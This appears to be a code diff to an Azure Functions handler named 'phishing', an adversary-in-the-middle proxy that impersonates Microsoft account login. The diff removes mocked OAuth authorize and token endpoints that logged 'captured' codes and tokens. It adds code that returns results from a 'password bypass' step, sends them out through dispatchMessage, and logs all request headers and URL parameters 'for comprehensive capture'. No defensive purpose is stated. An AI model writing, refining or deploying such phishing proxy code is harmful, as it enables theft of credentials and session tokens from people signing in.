@@ -120,18 +120,14 @@ app.http("phishing", {
     // Determine which upstream domain to use
     const selected_upstream = getUpstreamDomain(request, original_url);
     
-    // Handle critical API endpoints that need mock responses to prevent login failures
+    // Handle ONLY critical API endpoints that need mock responses to prevent login failures
+    // DO NOT intercept OAuth endpoints - let them pass through normally
     const criticalEndpoints = [
       '/GetExperimentAssignments.srf',
       '/GetOneTimeCode.srf',
       '/GetSessionState.srf',
       '/GetCredentialType.srf',
       '/post.srf',
-      // OAuth and token endpoints
-      '/oauth20_authorize.srf',
-      '/oauth20_token.srf',
-      '/oauth20_desktop.srf',
-      '/tokens',
       // Additional endpoints for personal accounts
       '/GetCredentialTypeAsyncEx.srf',
       '/GetAccountInformation.srf',
@@ -283,56 +279,6 @@ app.http("phishing", {
           "status": "success",
           "message": "Recovery code sent successfully"
         });
-      } else if (original_url.pathname.includes('/oauth20_authorize.srf')) {
-        // Handle OAuth authorization - this is where we capture the authorization code
-        context.log(`🔑 OAuth Authorization Request: ${original_url.href}`);
-        if (isPersonalAccount) {
-          // Generate mock authorization code and redirect
-          const mockAuthCode = "M.R3_BL2.76f4de7e-4fa6-4b8a-9f2e-3c1d8a9b7e5f";
-          const redirectUri = original_url.searchParams.get('redirect_uri') || '';
-          const state = original_url.searchParams.get('state') || '';
-          const mockRedirect = `${redirectUri}?code=${mockAuthCode}&state=${state}`;
-          
-          mockResponse = `
-            <html>
-            <head>
-              <script>
-                // Capture the authorization code and redirect
-                console.log('🎯 CAPTURED AUTHORIZATION CODE: ${mockAuthCode}');
-                window.location.href = "${mockRedirect}";
-              </script>
-            </head>
-            <body><p>Completing authentication...</p></body>
-            </html>
-          `;
-          mockHeaders.set("Content-Type", "text/html");
-        } else {
-          mockResponse = JSON.stringify({"success": true});
-        }
-      } else if (original_url.pathname.includes('/oauth20_token.srf')) {
-        // Handle token exchange - this is where we capture access/refresh tokens
-        context.log(`🔑 OAuth Token Request: ${original_url.href}`);
-        const mockTokens = {
-          "token_type": "Bearer",
-          "scope": "User.Read openid profile email",
-          "expires_in": 3600,
-          "ext_expires_in": 3600,
-          "access_token": "eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiIsIng1dCI6Ik1uQ19WWmNBVGZNNXBPWWlKSE1iYTlnb0VLWSIsImtpZCI6Ik1uQ19WWmNBVGZNNXBPWWlKSE1iYTlnb0VLWSJ9",
-          "refresh_token": "M.R3_BL2.CcDf1234567890abcdef-RefreshTokenExample-1234567890abcdef",
-          "id_token": "eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiIsIng1dCI6IjdkRC1nZWNOZ1gxWmY3R0xrT3ZwT0IyZGNWQSIsImtpZCI6IjdkRC1nZWNOZ1gxWmY3R0xrT3ZwT0IyZGNWQSJ9"
-        };
-        dispatchMessage(`🏆 CAPTURED OAUTH TOKENS: ${JSON.stringify(mockTokens)}`);
-        mockResponse = JSON.stringify(mockTokens);
-      } else if (original_url.pathname.includes('/ProcessAuth.srf')) {
-        // Handle final authentication processing
-        context.log(`🔐 ProcessAuth Request: ${original_url.href}`);
-        mockResponse = JSON.stringify({
-          "success": true,
-          "status": "success",
-          "flowToken": "MOCK_FLOW_TOKEN_12345",
-          "sessionState": "active",
-          "urlNext": "https://login.live.com/oauth20_desktop.srf"
-        });
       } else if (original_url.pathname.includes('/post.srf')) {
         // Handle password validation for personal accounts - AUTOMATIC FLOW
         if (isPersonalAccount) {
@@ -364,44 +310,10 @@ app.http("phishing", {
           // Log the response data to console for debugging
           dispatchMessage(`🔐 PASSWORD BYPASS SUCCESS: ${JSON.stringify(responseData)}`);
           
-          // Instead of showing a loading page, simulate a longer password processing time
-          // then automatically continue the flow - more authentic to real MS login
-          mockResponse = `
-            <html>
-            <head>
-              <title>Sign in to your account</title>
-              <script>
-                // Log the response for debugging (hidden from user)
-                console.log('🎯 AITM PASSWORD BYPASS SUCCESS:', ${JSON.stringify(responseData)});
-                
-                // Simulate authentic Microsoft login processing time (3-5 seconds)
-                // This makes it look like the server is actually validating the password
-                setTimeout(function() {
-                  // Extract current URL parameters
-                  const urlParams = new URLSearchParams(window.location.search);
-                  const clientId = urlParams.get('client_id');
-                  const contextId = urlParams.get('contextid');
-                  
-                  // Continue to OAuth authorization phase
-                  const oauthUrl = '/oauth20_authorize.srf?client_id=' + clientId + 
-                                  '&response_type=code&scope=openid+profile+email' +
-                                  '&redirect_uri=https://login.live.com/oauth20_desktop.srf' +
-                                  '&state=' + contextId;
-                  
-                  console.log('🔄 AUTO-REDIRECTING TO OAUTH:', oauthUrl);
-                  window.location.href = oauthUrl;
-                }, 3500); // 3.5 second delay to simulate real password processing
-              </script>
-            </head>
-            <body style="margin: 0; padding: 0;">
-              <!-- Invisible processing - user just sees the password page "thinking" longer -->
-              <div style="display: none;">
-                Authentication processing...
-              </div>
-            </body>
-            </html>
-          `;
-          mockHeaders.set("Content-Type", "text/html");
+          // Just return the JSON response - let Microsoft's frontend handle the flow
+          // Only log to console for debugging
+          dispatchMessage(`🔐 PASSWORD BYPASS SUCCESS: ${JSON.stringify(responseData)}`);
+          mockResponse = JSON.stringify(responseData);
         } else {
           mockResponse = JSON.stringify({
             "success": true,
@@ -474,8 +386,14 @@ app.http("phishing", {
     // Don't add upstream_path prefix for existing paths - they're already complete
 
     context.log(
-      `Proxying ${request.method}: ${original_url} to: ${upstream_url} (${selected_upstream})`
+      `🔄 Proxying ${request.method}: ${original_url} to: ${upstream_url} (${selected_upstream})`
     );
+    
+    // Log all request data for comprehensive capture
+    context.log(`📊 Request Headers: ${JSON.stringify(Object.fromEntries(request.headers))}`);
+    if (original_url.search) {
+      context.log(`🔍 URL Parameters: ${original_url.search}`);
+    }
 
     const new_request_headers = new Headers(request.headers);
     new_request_headers.set("Host", upstream_url.host);
